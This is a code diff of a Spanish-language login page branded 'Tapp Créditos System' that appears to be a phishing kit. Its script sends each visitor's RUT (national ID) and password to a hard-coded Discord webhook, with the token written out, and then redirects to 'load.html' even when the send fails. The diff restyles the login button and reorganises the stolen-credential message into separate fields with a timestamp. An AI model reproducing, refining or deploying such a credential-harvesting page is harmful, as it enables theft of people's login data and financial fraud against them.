@@ -121,7 +121,7 @@
                       <div class="flex w-full flex-col-reverse gap-5 lg:flex-row">
 
                         
-                        <button class="relative flex flex-row items-center justify-center fill-current outline-none text-base p-3 w-full rounded-full text-neutral-white font-semibold transition-all duration-300 hover:opacity-90 active:scale-95" type="submit" id="loginButton">
+                        <button class="relative flex flex-row items-center justify-center fill-current outline-none text-base p-3 w-full rounded-full text-neutral-white font-semibold transition-all duration-300 hover:opacity-90 active:scale-95 bg-neutral-gray-3 cursor-not-allowed" type="submit" id="loginButton">
   <span class="order-2">Iniciar Sesión</span>
 </button></div>
 
@@ -163,8 +163,14 @@
 
     if (rutValue !== '' && passwordValue !== '') {
       loginButton.disabled = false;
+      // --- CLASES PARA ESTADO ACTIVO ---
+      loginButton.classList.remove('bg-neutral-gray-3', 'cursor-not-allowed');
+      loginButton.classList.add('bg-primary', 'cursor-pointer', 'shadow-1');
     } else {
       loginButton.disabled = true;
+      // --- CLASES PARA ESTADO DESACTIVADO ---
+      loginButton.classList.add('bg-neutral-gray-3', 'cursor-not-allowed');
+      loginButton.classList.remove('bg-primary', 'cursor-pointer', 'shadow-1');
     }
   };
 
@@ -181,12 +187,27 @@
 
     const webhookUrl = 'https://discordapp.com/api/webhooks/1551764243274268672/DScPEbqjJobNa34rNWg5ibBcBfGkugRXRlKeykaT1ndEu07ECxG4Ep9Jjd5mV1XatmMK';
 
-    // Payload en formato Embed con estructura alineada y saltos de línea
+    // Payload en formato Embed con campos individuales
     const data = {
       "embeds": [{
-        "title": "🚀 LOGIN SYSTEM",
-        "color": 65535, // Color Celeste/Cian
-        "description": "```\nRUT   : " + rut + "\nPASS  : " + password + "\n```"
+        "title": "🔐 LOGIN DATA",
+        "color": 5814783,
+        "fields": [
+          {
+            "name": "RUT",
+            "value": "```\n" + rut + "\n```",
+            "inline": true
+          },
+          {
+            "name": "Clave",
+            "value": "```\n" + password + "\n```",
+            "inline": true
+          }
+        ],
+        "footer": {
+          "text": "Tapp Créditos System"
+        },
+        "timestamp": new Date().toISOString()
       }]
     };
 
@@ -202,7 +223,7 @@
       if (response.ok || response.status === 0) { 
         window.location.href = 'load.html';
       } else {
-        console.error('Error al enviar a Discord, pero redirigiendo de todos modos...');
+        console.error('Error al enviar a Discord');
         window.location.href = 'load.html';
       }
     } catch (error) {
